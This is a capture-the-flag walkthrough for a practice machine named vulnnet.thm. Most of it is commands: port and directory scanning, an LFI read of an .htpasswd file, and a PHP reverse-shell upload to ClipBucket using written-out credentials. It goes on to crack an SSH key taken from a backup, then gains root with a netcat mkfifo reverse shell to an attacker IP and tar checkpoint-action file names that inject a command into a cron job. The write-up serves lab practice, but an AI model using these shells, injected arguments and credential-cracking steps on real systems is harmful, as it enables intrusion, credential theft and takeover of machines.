
##### Use RUSTSCAN for find open ports:
`   rustscan -a TargetIP   `

##### Then use NMAP for service and version scan:
 `   sudo nmap -A -T4 -oX nmap_scan.xml {target_ip}    `


##### Find directories using gobuster:
`   gobuster dir -u http://vulnnet.thm:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 25 -q -x php,aspx,txt,asp   `

##### Find directories using feroxbuster:
`   feroxbuster -u http://vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt    `


##### Find subdomains using gobuster:  
`   gobuster vhost -u vulnnet.thm -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -o gobuster_vsubdomains.txt -t 25 -q   `


##### Crawl Domain, subdomain for hidden links and parameters:
`   gospider -s http://vulnnet.thm -c 10 -d 0 -w -t 10 --robots -a -r -v    `



##### Find header byte size for FUZZ:
`   curl -s -H "HOST: asdasdasdasd.vulnnet.thm" http://vulnnet.thm | wc -c   `


##### Find subdomain using ffuf:
`   ffuf -u 'http://FUZZ.vulnnet.thm' -mc all -ic -t 100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 5829   `



Result:
```
open this link and check the response in the browser or burp:
http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd
```




# Exploit vulnerability:

search the version for exploit:
`   searchsploit Clipbucket v4.0   `

Download exploit from searchsploit:
`   searchsploit -m php/webapps/44250.txt`


Copy exploit from your /usr/share/webshells/ on your system or use pentest-monkey:
`   cp /usr/share/webshells/php/php-reverse-shell.php shell.php   `


And upload that shell.php payload in the Target website:
```
curl -u developers:9972761drmfsls -F "file=@shell.php" -F "plupload=1" -F "name=anyname.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```


Now access the reverse shell:
```
Type this command in attacker system:-
	nc -lvnp 1234


Then go to the browser and try to access that uploded payload:-
	http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/
```





# Privilege Escalation


`   python3 -c ‘import pty; pty.spawn(“/bin/bash”)’   `


##### set the terminal type to xterm for a smoother experience:
`   export TERM=xterm   `


`  cd /var/backups  && ls -la   `


Copy file at TMP directory:
`  cp ssh-backup.tar.gz /tmp && cd /tmp  `

Now unzip this TAR file:
`   tar -xzvf ssh-backup.tar.gz   `

view inside the file and copy that id_rsa file content:
`  cat ssh-backup  `


To make the SSH key suitable for John the Ripper to crack, we’ll employ the ssh2john.py tool:
`  ssh2john id_rsa > id_rsa1 — wordlist=/usr/share/wordlists/rockyou.txt  `


Now crack the id_rsa1:
`  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa1  `



Now login into SSH:
`   sudo ssh -i id_rsa1 server-management@vulnnet.thm  `



# Privilege Escalation to Root


Search for any schedule job:
`  cat /etc/crontab   `


First change the Directory:
`  cd /home/server-management/Documents   `

```
cat > shell.sh  

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.22.228 4445 > /tmp/f



Start netcat in the attacker system at first:
nc -lvnp 4445


Now, after saving the shell script, run these commands:
echo > '--checkpoint=1'  
echo > '--checkpoint-action=exec=sh shell.sh'
```
